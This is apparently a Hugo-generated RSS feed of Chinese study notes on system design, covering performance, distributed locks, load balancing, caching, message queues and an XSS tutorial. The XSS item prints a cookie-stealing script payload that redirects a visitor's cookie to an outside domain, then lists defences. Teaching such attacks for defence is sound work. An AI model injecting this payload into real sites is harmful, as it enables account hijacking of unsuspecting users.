<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>系统设计 on KeepLearning</title>
    <link>https://example.com/keeplearning/docs/system-design/</link>
    <description>Recent content in 系统设计 on KeepLearning</description>
    <generator>Hugo -- gohugo.io</generator><atom:link href="https://example.com/keeplearning/docs/system-design/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>系统设计基础</title>
      <link>https://example.com/keeplearning/docs/system-design/overview/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/overview/</guid>
      <description>系统设计基础 # 一、性能 # 性能指标 # 1. 响应时间 # 指某个请求从发出到接收到响应消耗的时间。
在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。
2. 吞吐量 # 指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。
3. 并发用户数 # 指系统能同时处理的并发用户请求数量。
在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。
目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：
多 CPU IO 等待时间 使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。
并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。
性能优化 # 1. 集群 # 将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。
2. 缓存 # 缓存能够提高性能的原因如下：
缓存数据通常位于内存等介质中，这种介质对于读操作特别快； 缓存数据可以位于靠近用户的地理位置上； 可以将计算结果进行缓存，从而避免重复计算。 3. 异步 # 某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。
二、伸缩性 # 指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。
伸缩性与性能 # 如果系统存在性能问题，那么单个用户的请求总是很慢的；
如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。
实现伸缩性 # 应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。
关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。
对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。
三、扩展性 # 指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。</description>
    </item>
    
    <item>
      <title>分布式</title>
      <link>https://example.com/keeplearning/docs/system-design/distributed/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/distributed/</guid>
      <description>分布式 # 一、分布式锁 # 在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。
阻塞锁通常使用互斥量来实现：
互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态； 互斥量为 1 表示未锁定状态。 1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。
数据库的唯一索引 # 获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。
存在以下几个问题：
锁没有失效时间，解锁失败的话其它进程无法再获得该锁； 只能是非阻塞锁，插入失败直接就报错了，无法重试； 不可重入，已经获得锁的进程也必须重新获取锁。 Redis 的 SETNX 指令 # 使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。
SETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。
EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。
Redis 的 RedLock 算法 # 使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。
尝试从 N 个互相独立 Redis 实例获取锁； 计算获取锁消耗的时间，只有时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，才认为获取锁成功； 如果获取锁失败，就到每个实例上释放锁。 Zookeeper 的有序节点 # 1. Zookeeper 抽象模型 # Zookeeper 提供了一种树形结构的命名空间，/app1/p_1 节点的父节点为 /app1。</description>
    </item>
    
    <item>
      <title>集群</title>
      <link>https://example.com/keeplearning/docs/system-design/cluster/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/cluster/</guid>
      <description>集群 # 一、负载均衡 # 集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。
负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。
负载均衡器可以用来实现高可用以及伸缩性：
高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用； 伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。 负载均衡器运行过程包含两个部分：
根据负载均衡算法得到转发的节点； 进行转发。 负载均衡算法 # 1. 轮询（Round Robin） # 轮询算法把每个请求轮流发送到每个服务器上。
下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。
该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。
2. 加权轮询（Weighted Round Robbin） # 加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。
例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。
3. 最少连接（least Connections） # 由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。</description>
    </item>
    
    <item>
      <title>攻击技术</title>
      <link>https://example.com/keeplearning/docs/system-design/attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/attack/</guid>
      <description>攻击技术 # 一、跨站脚本攻击 # 概念 # 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
攻击原理 # 例如有一个论坛网站，攻击者可以在上面发布以下内容：
&amp;lt;script&amp;gt;location.href = &amp;#34;//domain.com/?c=&amp;#34; + document.cookie&amp;lt;/script&amp;gt; 之后该内容可能会被渲染成以下形式：
&amp;lt;p&amp;gt; &amp;lt;script&amp;gt;location.href = &amp;#34;//domain.com/?c=&amp;#34; + document.cookie&amp;lt;/script&amp;gt; &amp;lt;/p&amp;gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
危害 # 窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 防范手段 # 1. 设置 Cookie 为 HttpOnly # 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
2. 过滤特殊字符 # 例如将 &amp;lt; 转义为 &amp;amp;lt;，将 &amp;gt; 转义为 &amp;amp;gt;，从而避免 HTML 和 Jascript 代码的运行。</description>
    </item>
    
    <item>
      <title>缓存</title>
      <link>https://example.com/keeplearning/docs/system-design/cache/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/cache/</guid>
      <description>缓存 # 一、缓存特征 # 命中率 # 当某个请求能够通过访问缓存而得到响应时，称为缓存命中。
缓存命中率越高，缓存的利用率也就越高。
最大空间 # 缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。
当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。
淘汰策略 # FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。
LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。
LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。
二、缓存位置 # 浏览器 # 当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。
ISP # 网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。
反向代理 # 反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。
本地缓存 # 使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。
分布式缓存 # 使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。
相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。
数据库缓存 # MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。
Java 内部的缓存 # Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。
CPU 多级缓存 # CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。</description>
    </item>
    
    <item>
      <title>消息队列</title>
      <link>https://example.com/keeplearning/docs/system-design/queue-message/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/queue-message/</guid>
      <description> 消息队列 # 一、消息模型 # 点对点 # 消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。
发布/订阅 # 消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。
发布与订阅模式和观察者模式有以下不同：
观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。 观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。 二、使用场景 # 异步处理 # 发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。
例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。
只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。
流量削锋 # 在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。
可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。
应用解耦 # 如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。
通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。
三、可靠性 # 发送端的可靠性 # 发送端完成操作后一定能将消息成功发送到消息队列中。
实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。
接收端的可靠性 # 接收端能够从消息队列成功消费一次消息。
两种实现方法：
保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。 保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。 参考资料 # Observer vs Pub-Sub 消息队列中点对点与发布订阅区别 </description>
    </item>
    
  </channel>
</rss>
